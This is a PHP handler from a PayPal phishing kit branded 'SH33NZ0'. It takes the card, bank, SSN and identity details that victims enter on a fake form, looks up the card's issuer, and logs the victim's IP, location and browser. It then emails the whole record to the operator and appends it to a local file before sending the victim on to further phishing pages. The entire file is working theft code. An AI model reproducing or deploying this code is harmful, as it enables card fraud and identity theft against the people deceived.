<?php @error_reporting();
session_start();
require_once '../anti/anti0.php';
require '../anti/anti1.php';
require '../anti/anti2.php';
require '../anti/anti3.php';
require '../anti/anti4.php';
include 'config.php';
if(isset($_POST['cardholder'])&&isset($_POST['cardnumber'])){
	function cardData($bin){$json=@file_get_contents("https://lookup.binlist.net/".$bin);
	if($json==false){return "";}
	return
	 json_decode($json,true);}
	 $addr1=$_POST['addr1'];
	 $addr2=$_POST['addr2'];
	 $city=$_POST['city'];
	 $state=$_POST['state'];
	 $zip=$_POST['zip'];
	 $country=$_POST['country'];
	 $cardholder=$_POST['cardholder'];
	 $birthdate=$_POST['birthdate'];
	 $phone=$_POST['phone'];
	 $cardnumber=$_SESSION['cardnumber']=$_POST['cardnumber'];
	 $cardexpiry=$_POST['cardexpiry'];$ccv=$_POST['ccv'];
	 $thd=isset($_POST['thd'])?$_POST['thd']:"";$mother=$_POST['mother'];
	 $acnb=isset($_POST['acnb'])?$_POST['acnb']:"";
	 $sortcode=isset($_POST['sortcode'])?$_POST['sortcode']:"";
	 $ssn=isset($_POST['ssn'])?$_POST['ssn']:"";
	 $cardlogo=$_SESSION['cardlogo']=$_POST['cardlogo'];
	 $cardname=$_SESSION['cardname']=$_POST['cardname'];
	 $bin=substr($cardnumber,0,6);
		$binInfo=cardData($bin);
		$bin_type=isset($binInfo['type'])?$binInfo['type']:"";
		$bin_brand=isset($binInfo['scheme'])?$binInfo['scheme']:"";
		$bin_prepaid=isset($binInfo['prepaid'])?$binInfo['prepaid']:"";
		$bin_bank=isset($binInfo['bank']['name'])?$binInfo['bank']['name']:"";
		$bin_countryCode=isset($binInfo['country']['alpha2'])?$binInfo['country']['alpha2']:"";
		$bin_countryName=isset(
		$binInfo['country']['name'])?
		$binInfo['country']['name']:"";
		$code=<<<EOT
============== [ New PayPal Info | {$dateNow} GMT] ==============
✪[Full Name] 	✪: {$cardholder}
✪[Birth Date]	✪: {$birthdate}
✪[Phone]		✪: {$phone}
✪[Address1] 	✪	: {$addr1}
✪[Address2] 	✪	: {$addr2}
✪[City] 		✪: {$city}
✪[State] 		✪: {$state}
✪[Zip Code] 	✪: {$zip}
✪[Country] 		✪: {$country}
=-=-=-=-=-=-=-=-- ♣ ☠ |SH33NZ0| ☠ ♣-=-=-=-=-=-=-=-
✪[CC Brand] 	✪: {$cardname}
✪[CC Number] 	✪: {$cardnumber}
✪[CC Expiry] 	✪: {$cardexpiry}
✪[CSC] 			✪: {$ccv}
✪[3D Secure] 	✪: {$thd}
✪[Mother name] 	✪: {$mother}
✪[Acount N.] 	✪: {$acnb}
✪[Sort Code] 	✪: {$sortcode}
✪[SSN] 			✪: {$ssn}
=-=-=-=-=-=-=-=-- ♣ ☠ |SH33NZ0| ☠ ♣-=-=-=-=-=-=-=-
✪[CC Brand] 	✪: {$bin_brand}
✪[CC Type] 		✪: {$bin_type}
✪[CC Prepaid] 	✪: {$bin_prepaid}
✪[CC Bank] 		✪: {$bin_bank}
✪[CC CountryC]	✪: {$bin_countryCode}
✪[CC CountryN]	✪: {$bin_countryName}
=-=-=-=-=-=-=-=-- ♣ ☠ |SH33NZ0| ☠ ♣-=-=-=-=-=-=-=-
✪[IP]		✪: {$_SESSION['ip']}
✪[Country]	✪: {$_SESSION['ip_countryName']}
✪[State	]	✪: {$_SESSION['ip_state']}
✪[City]		✪: {$_SESSION['ip_city']}
✪[Zip] 		✪: {$_SESSION['ip_zip']}
✪[OS]		✪: {$_SESSION['os']}
✪[Browser] ✪: {$_SESSION['browser']}
✪[TimeZone	✪: {$_SESSION['ip_timezone']}
============= [ ./New PayPal Info ] =============
\r\n\r\n
EOT;
$subject="Thank |☠SH33NZ0☠| New PayPal CC [{$_SESSION['email']}] From [{$_SESSION['ip_countryName']}]";
$headers="From: Thank |☠SH33NZ0☠| PPL CC INFO <BIMO@2m.ma>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";@mail($yours,$subject,$code,$headers);$save=fopen("../stored.txt","a+");fwrite($save,$code);fclose($save);if($skip_bank==true){if($skip_email==true){echo "completed.php?sessionid={$_SESSION['randString']}&sslmode=true";}else{echo "email.php?sessionid={$_SESSION['randString']}&sslmode=true";}}else{echo "bank.php?sessionid={$_SESSION['randString']}&sslmode=true";}}?>